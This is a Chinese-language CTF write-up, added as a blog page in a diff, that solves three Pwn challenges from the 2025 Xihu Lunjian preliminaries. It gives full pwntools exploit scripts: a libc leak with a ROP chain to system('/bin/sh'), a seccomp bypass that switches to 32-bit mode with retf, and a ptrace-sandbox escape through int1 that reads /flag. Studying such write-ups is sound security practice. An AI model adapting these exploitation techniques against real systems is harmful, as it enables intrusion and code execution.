@@ -1,0 +1,269 @@
+export const layout = "#components/Page.js";
+export const title = "西湖论剑 2025 Writeup";
+export const description = "2025西湖论剑初赛 Pwn 题解";
+export const created = "2025-04-10";
+
+# 2025西湖论剑初赛 Pwn 题解
+
+人生第一次打西湖论剑，虽然是跟着 401 的师傅只看了看题，但是感觉还是有一点收获的。
+
+赛后复现 ak 了本场，在这里记录一下。
+
+## Vpwn
+
+比较简单的栈虚拟机，逆向无难度，给了任意栈地址读写原语，先泄漏 libc 然后修改返回地址即可。
+
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./Vpwn_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, """
+    decompiler connect ida --host localhost --port 3662
+    breakrva 0x17d0
+    """)
+
+
+def choose(op):
+    io.sendlineafter(b"Enter your choice: ", str(op).encode())
+
+
+def edit(idx, value):
+    choose(1)
+    io.sendlineafter(b"Enter the index to edit (0-based): ", str(idx).encode())
+    io.sendlineafter(b"Enter the new value: ", str(value).encode())
+
+
+def push(value):
+    choose(2)
+    io.sendlineafter(b"Enter the value to push: ", str(value).encode())
+
+
+def pop():
+    choose(3)
+
+
+def show():
+    choose(4)
+    io.recvuntil(b"StackVector contents: ")
+    res = [int(key, 10) for key in io.recvuntil(b" \n", drop=True).decode().split(" ")]
+    return res
+
+
+for i in range(6):
+    push(i + 1)
+push(30)
+
+# push(11)
+# pop()
+res = show()
+# io.recvuntil()
+# print(res)
+libc_start_main = int(hex(res[19]) + hex(res[18] & 0xffffffff)[2:], 16)
+libc_base = libc_start_main - 0x29d90
+log.info(f"libc_start_main => {hex(libc_start_main)}\nlibc_base => {hex(libc_base)}")
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
+pop_rdi_ret = libc_base + 0x000000000002a3e5
+ret = libc_base + 0x00000000000f8c92
+edit(18, pop_rdi_ret & 0xffffffff)
+edit(20, binsh & 0xffffffff)
+edit(21, binsh >> 32)
+edit(22, ret & 0xffffffff)
+edit(23, ret >> 32)
+edit(24, system & 0xffffffff)
+edit(25, system >> 32)
+choose(5)
+io.interactive()
+```
+
+## door
+
+题目开了沙箱，会先 check shellcode 中 `syscall` 的数量，沙箱条件如下：
+
+```
+line  CODE  JT   JF      K
+=================================
+0000: 0x20 0x00 0x00 0x00000000  A = sys_number
+0001: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0012
+0002: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0013
+0003: 0x15 0x09 0x00 0x00000001  if (A == write) goto 0013
+0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013
+0005: 0x15 0x07 0x00 0x00000004  if (A == stat) goto 0013
+0006: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0013
+0007: 0x15 0x05 0x00 0x00000006  if (A == lstat) goto 0013
+0008: 0x15 0x04 0x00 0x00000007  if (A == poll) goto 0013
+0009: 0x15 0x03 0x00 0x00000008  if (A == lseek) goto 0013
+0010: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0013
+0011: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0013
+0012: 0x06 0x00 0x00 0x00000000  return KILL
+0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+
+这里预期解是用 `open` + `mmap` + `write`，我的解法是用 `retf` 切换指令集架构，然后打 orw。
+
+```python
+from pwn import *
+from sys import argv
+
+proc = "./pwn"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    command = ["ps", "-ax"]
+    grep_command = ["grep", proc]
+    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
+    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
+    ps_process.stdout.close()
+    output = grep_process.communicate()[0]
+    s = output.decode()
+    print(s.split("\n"))
+    pid = int(s.split("\n")[0][2:7], 10)
+    # pause()
+    attach(pid, """
+    b *0x401709
+    """)
+
+
+sc = asm("""
+xor esp, esp
+mov rsp, 0x10500
+mov eax, 0x23
+mov [rsp+4], eax
+mov eax, 0x1001b
+mov [rsp], eax
+""")
+
+sc += asm("""
+.code32        # 添加此行指定32位模式
+
+retf
+
+mov eax, 5
+xor ebx, ebx
+xor ecx, ecx
+mov ecx, 4
+mov ebx, 0x10090
+int 0x80
+
+mov eax, 3
+mov ebx, 3
+mov ecx, 0x10900
+mov edx, 0x100
+int 0x80
+
+mov eax, 4
+mov ebx, 1
+mov ecx, 0x10900
+mov edx, 0x100
+int 0x80
+""")
+sc = sc.ljust(0x90, asm("ret"))
+
+io.recvuntil(b'MADE IN HEAVEN !!!!!!!!!!!!!!!!\n')
+io.sendline(sc + b"/flag\x00")
+
+io.interactive()
+```
+
+
+## babytrace
+
+程序使用 ptrace 实现了一个沙箱，但是 `waitpid` 没有过滤 `SIGTRAP` 信号，可以用 `int1/3` 绕过。
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "babytrace_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    command = ["ps", "-ax"]
+    grep_command = ["grep", proc]
+    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
+    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
+    ps_process.stdout.close()
+    output = grep_process.communicate()[0]
+    s = output.decode()
+    # print(s.split("\n"))
+    pid = int(s.split("\n")[1][2:7], 10)
+    print(pid)
+    # pause()
+    attach(pid, """
+    decompiler connect ida --host 127.0.0.1 --port 3662
+    breakrva 0xd06
+    # breakrva 0xd82
+    """)
+
+
+def choose(op):
+    io.sendlineafter(b"choose one >", str(op).encode())
+
+
+def write(buf, idx, value):
+    choose(1)
+    io.sendlineafter(b"recv:\n", buf)
+    io.sendlineafter(b"which one?\n", str(idx).encode())
+    io.sendlineafter(b"set value?\n", str(value).encode())
+
+
+def read(idx):
+    choose(2)
+    io.sendlineafter(b'which one?\n', str(idx).encode())
+    io.recvuntil(b"] = ")
+    res = int(io.recvuntil(b"\n", drop=True), 10)
+    return res
+
+
+stderr = read(-2)
+libc_base = stderr - libc.sym['_IO_2_1_stderr_']
+log.info(f"libc_base => {hex(libc_base)}")
+rbp_addr = read(-4)
+log.info(f"rbp_addr => {hex(rbp_addr)}")
+
+buf_addr = rbp_addr - 0x250
+start_addr = rbp_addr - 0x20
+
+strlen_got = libc_base + 0x219098
+int1_ret = libc_base + 0x00000000000c6d6e
+add_rsp_ret = libc_base + 0x0000000000114b5c
+pop_rdi_ret = libc_base + 0x000000000002a3e5
+pop_rsi_ret = libc_base + 0x000000000002be51
+pop_rdx_ret = libc_base + 0x00000000000796a2
+pop_rax_ret = libc_base + 0x0000000000045eb0
+syscall = libc_base + 0x0000000000091316
+
+offset = (start_addr - strlen_got) // 8
+
+payload = flat([int1_ret])
+payload += flat([pop_rdi_ret, buf_addr + 0x100, pop_rsi_ret, 4, pop_rdx_ret, 0, pop_rax_ret, 2, syscall])
+payload += flat([pop_rdi_ret, 3, pop_rsi_ret, buf_addr + 0x300, pop_rdx_ret, 0x30, pop_rax_ret, 0, syscall])
+payload += flat([pop_rdi_ret, 1, pop_rsi_ret, buf_addr + 0x300, pop_rdx_ret, 0x30, pop_rax_ret, 1, syscall])
+payload = payload.ljust(0x100, asm("ret"))
+payload += b"/flag\x00"
+write(payload, -offset, add_rsp_ret)
+
+io.interactive()
+```
